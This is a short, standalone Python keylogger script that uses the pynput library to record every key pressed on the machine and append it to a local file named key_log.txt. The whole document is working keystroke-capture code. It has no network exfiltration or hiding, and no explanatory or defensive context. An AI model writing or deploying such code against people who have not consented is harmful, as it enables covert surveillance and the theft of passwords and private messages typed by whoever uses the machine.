from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(f"[{key}]")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()